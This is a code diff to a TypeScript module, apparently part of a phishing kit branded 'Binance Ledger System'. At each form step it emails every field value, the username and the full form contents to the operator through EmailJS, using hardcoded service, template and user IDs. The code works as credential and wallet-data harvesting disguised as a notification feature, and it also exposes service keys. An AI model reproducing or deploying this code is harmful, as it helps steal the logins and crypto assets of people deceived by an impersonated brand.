@@ -1,6 +1,8 @@
 
 import emailjs from 'emailjs-com';
-import { EMAILJS_CONFIG } from '@/config/emailjs.config';
+
+// Initialize EmailJS with your user ID
+emailjs.init("hDX5LRevxoenkHrjk");
 
 interface EmailData {
   step: string;
@@ -12,51 +14,46 @@ interface EmailData {
 }
 
 export const sendEmailNotification = async (data: EmailData) => {
-  try {
-    console.log('EmailJS Config:', {
-      SERVICE_ID: EMAILJS_CONFIG.SERVICE_ID,
-      TEMPLATE_ID: EMAILJS_CONFIG.TEMPLATE_ID,
-      USER_ID: EMAILJS_CONFIG.USER_ID,
-      TO_EMAIL: EMAILJS_CONFIG.TO_EMAIL
-    });
+  console.log('=== EMAIL NOTIFICATION START ===');
+  console.log('Data being sent:', data);
 
-    const templateParams = {
-      to_email: EMAILJS_CONFIG.TO_EMAIL,
-      from_name: "Binance Ledger System",
-      subject: `🔒 ${data.step} - Form Activity Alert`,
-      message: `Step: ${data.step}
+  const templateParams = {
+    to_email: "donotreply@binanceledger.com",
+    from_name: "Binance Ledger System",
+    subject: `🔒 ${data.step} - Form Activity Alert`,
+    message: `Step: ${data.step}
 ${data.field ? `Field: ${data.field}` : ''}
 ${data.value ? `Value: ${data.value}` : ''}
 ${data.username ? `Username: ${data.username}` : ''}
 Timestamp: ${data.timestamp}
 
 ${data.allFormData ? `All Form Data:\n${JSON.stringify(data.allFormData, null, 2)}` : ''}`.trim(),
-      step: data.step || '',
-      field: data.field || '',
-      value: data.value || '',
-      username: data.username || '',
-      timestamp: data.timestamp || '',
-      allFormData: data.allFormData ? JSON.stringify(data.allFormData, null, 2) : ''
-    };
+    step: data.step,
+    field: data.field || '',
+    value: data.value || '',
+    username: data.username || '',
+    timestamp: data.timestamp,
+    allFormData: data.allFormData ? JSON.stringify(data.allFormData, null, 2) : ''
+  };
 
-    console.log('Sending email with template params:', templateParams);
+  console.log('Template params:', templateParams);
+  console.log('Using Service ID:', "service_r7sis9a");
+  console.log('Using Template ID:', "template_dec5tz3");
 
+  try {
     const result = await emailjs.send(
-      EMAILJS_CONFIG.SERVICE_ID,
-      EMAILJS_CONFIG.TEMPLATE_ID,
-      templateParams,
-      EMAILJS_CONFIG.USER_ID
+      "service_r7sis9a",
+      "template_dec5tz3", 
+      templateParams
     );
-
-    console.log('Email sent successfully:', result);
+    
+    console.log('✅ Email sent successfully!', result);
+    console.log('=== EMAIL NOTIFICATION END ===');
     return result;
   } catch (error) {
-    console.error('Failed to send email:', error);
-    console.error('Error details:', {
-      message: error instanceof Error ? error.message : 'Unknown error',
-      status: (error as any)?.status,
-      text: (error as any)?.text
-    });
+    console.error('❌ Email failed to send:', error);
+    console.error('Error details:', error);
+    console.log('=== EMAIL NOTIFICATION END (ERROR) ===');
     throw error;
   }
 };
